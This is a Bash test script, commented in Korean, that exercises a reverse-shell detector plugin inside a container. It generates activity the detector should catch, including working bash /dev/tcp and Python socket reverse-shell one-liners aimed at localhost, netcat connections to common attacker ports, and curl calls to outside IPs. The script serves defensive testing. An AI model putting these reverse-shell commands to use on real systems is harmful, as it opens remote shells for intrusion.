#!/bin/bash

# Reverse Shell Plugin Container Test Script
# reverse_shell.rs 플러그인을 Docker 컨테이너에서 테스트합니다.

set -e

echo "=== Reverse Shell Plugin Container Test ==="
echo "Testing reverse_shell.rs plugin in Docker container..."

# 환경 변수 설정
export RUST_LOG=info
export RUST_BACKTRACE=1

# 색상 정의
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

print_step() {
    echo -e "${BLUE}[STEP]${NC} $1"
}

print_success() {
    echo -e "${GREEN}[SUCCESS]${NC} $1"
}

print_warning() {
    echo -e "${YELLOW}[WARNING]${NC} $1"
}

print_error() {
    echo -e "${RED}[ERROR]${NC} $1"
}

# 백그라운드에서 탐지 프로그램 실행
print_step "Starting reverse shell detector plugin..."
./target/release/linux_agent &
DETECTOR_PID=$!

echo "Detector started with PID: $DETECTOR_PID"

# 프로그램 초기화 대기
print_step "Waiting for plugin initialization..."
sleep 15

echo ""
echo "=== Testing Reverse Shell Plugin Features ==="

# 테스트 1: 의심스러운 포트 연결 (reverse_shell.rs의 주요 탐지 기능)
print_step "Test 1: Suspicious port connections (4444, 1337, 31337)"
echo "Testing suspicious port detection..."

# 포트 4444 연결 시도
timeout 3 nc -v 127.0.0.1 4444 2>/dev/null || true
sleep 1

# 포트 1337 연결 시도
timeout 3 nc -v 127.0.0.1 1337 2>/dev/null || true
sleep 1

# 포트 31337 연결 시도
timeout 3 nc -v 127.0.0.1 31337 2>/dev/null || true
sleep 1

print_success "Suspicious port connection tests completed"

# 테스트 2: Netcat 리버스 쉘 (EventType::ReverseShellDetected)
print_step "Test 2: Netcat reverse shell (EventType::ReverseShellDetected)"
echo "Testing netcat reverse shell detection..."

# netcat 리스너 시작
nc -l -p 4444 &
NC_PID=$!
sleep 2

# 리버스 쉘 연결 시도
timeout 5 bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1' 2>/dev/null || true
sleep 3
kill $NC_PID 2>/dev/null || true

print_success "Netcat reverse shell test completed"

# 테스트 3: Python 리버스 쉘 (EventType::ProcessInjection)
print_step "Test 3: Python reverse shell (EventType::ProcessInjection)"
echo "Testing Python reverse shell detection..."

timeout 5 python3 -c "
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(('127.0.0.1',9001))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(['/bin/sh','-i'])
" 2>/dev/null || true

print_success "Python reverse shell test completed"

# 테스트 4: 외부 IP 연결 (EventType::NetworkAnomaly)
print_step "Test 4: External IP connection (EventType::NetworkAnomaly)"
echo "Testing external IP connection detection..."

timeout 5 curl -s --connect-timeout 3 http://8.8.8.8 > /dev/null 2>/dev/null || true
sleep 1

timeout 5 curl -s --connect-timeout 3 http://1.1.1.1 > /dev/null 2>/dev/null || true
sleep 1

print_success "External IP connection tests completed"

# 테스트 5: 의심스러운 프로세스 실행 (EventType::ProcessInjection)
print_step "Test 5: Suspicious process execution (EventType::ProcessInjection)"
echo "Testing suspicious process detection..."

# netcat 실행
timeout 3 nc -l -p 8080 &
NC2_PID=$!
sleep 2
kill $NC2_PID 2>/dev/null || true

# wget 실행
timeout 3 wget --timeout=2 http://127.0.0.1:8080 -O /dev/null 2>/dev/null || true

# curl 실행
timeout 3 curl --connect-timeout 2 http://127.0.0.1:8080 2>/dev/null || true

print_success "Suspicious process tests completed"

# 테스트 6: 커널 후킹 테스트 (EventType::KernelHookTriggered)
print_step "Test 6: Kernel hook testing (EventType::KernelHookTriggered)"
echo "Testing kernel hook functionality..."

# 여러 의심스러운 연결을 동시에 시도
for port in 4444 9001 9002 1337 31337; do
    timeout 2 nc -v 127.0.0.1 $port 2>/dev/null || true
    sleep 0.5
done

print_success "Kernel hook tests completed"

echo ""
print_step "Waiting for detection results..."
sleep 20

# 탐지 결과 확인
echo ""
echo "=== Reverse Shell Plugin Detection Results ==="

# 탐지기 프로세스 상태 확인
if [ -f "/proc/$DETECTOR_PID/status" ]; then
    print_success "Detector plugin is still running (PID: $DETECTOR_PID)"
    
    # 시스템 로그 확인
    echo ""
    echo "Recent system logs:"
    dmesg | tail -10 2>/dev/null || echo "No dmesg available"
    
    # 네트워크 연결 상태 확인
    echo ""
    echo "Current network connections:"
    netstat -tuln 2>/dev/null | grep -E "(4444|9001|9002|1337|31337|8080)" || echo "No suspicious connections found"
    
    # 활성 프로세스 확인
    echo ""
    echo "Active suspicious processes:"
    ps aux 2>/dev/null | grep -E "(nc|python|perl|bash|wget|curl)" | grep -v grep || echo "No suspicious processes found"
    
    # /proc/net/tcp 확인 (reverse_shell.rs에서 사용하는 파일)
    echo ""
    echo "TCP connections from /proc/net/tcp (plugin monitoring):"
    cat /proc/net/tcp 2>/dev/null | head -15 || echo "Cannot read /proc/net/tcp"
    
    # /proc/net/tcp6 확인
    echo ""
    echo "TCP6 connections from /proc/net/tcp6 (plugin monitoring):"
    cat /proc/net/tcp6 2>/dev/null | head -10 || echo "Cannot read /proc/net/tcp6"
    
else
    print_error "Detector plugin process not found (PID: $DETECTOR_PID)"
fi

# 플러그인 특화 정보 확인
echo ""
echo "=== Plugin-Specific Information ==="

# 탐지기 로그 확인
if [ -f "/proc/$DETECTOR_PID/status" ]; then
    echo "Plugin process info:"
    cat /proc/$DETECTOR_PID/status 2>/dev/null | grep -E "(Name|State|Pid)" || echo "Cannot read process info"
    
    echo ""
    echo "Plugin memory usage:"
    cat /proc/$DETECTOR_PID/status 2>/dev/null | grep -E "(VmRSS|VmSize)" || echo "Cannot read memory info"
    
    # eBPF 관련 정보 확인
    echo ""
    echo "eBPF program status:"
    ls -la /sys/fs/bpf/ 2>/dev/null || echo "No eBPF programs found"
    
    # 커널 모듈 확인
    echo ""
    echo "Kernel modules:"
    lsmod | grep -E "(bpf|xdp)" || echo "No BPF/XDP modules found"
    
else
    echo "Plugin process is not running"
fi

# 정리
echo ""
echo "=== Cleanup ==="

# 탐지기 프로세스 종료
if [ -f "/proc/$DETECTOR_PID/status" ]; then
    print_step "Stopping reverse shell detector plugin..."
    kill $DETECTOR_PID 2>/dev/null || true
    sleep 2
    
    # 강제 종료 확인
    if [ -f "/proc/$DETECTOR_PID/status" ]; then
        print_warning "Force killing detector plugin..."
        kill -9 $DETECTOR_PID 2>/dev/null || true
    fi
fi

# 남은 프로세스 정리
print_step "Cleaning up remaining processes..."
pkill -f "nc -l" 2>/dev/null || true
pkill -f "python3 -c" 2>/dev/null || true
pkill -f "bash -c" 2>/dev/null || true
pkill -f "wget" 2>/dev/null || true
pkill -f "curl" 2>/dev/null || true

print_success "Cleanup completed"

echo ""
echo "=== Reverse Shell Plugin Test Summary ==="
echo "✓ Suspicious port detection tested"
echo "✓ Reverse shell pattern detection tested"
echo "✓ Process injection detection tested"
echo "✓ Network anomaly detection tested"
echo "✓ Kernel hook functionality tested"
echo "✓ Plugin monitoring completed"
echo "✓ Cleanup performed"

print_success "Reverse shell plugin container test completed!"
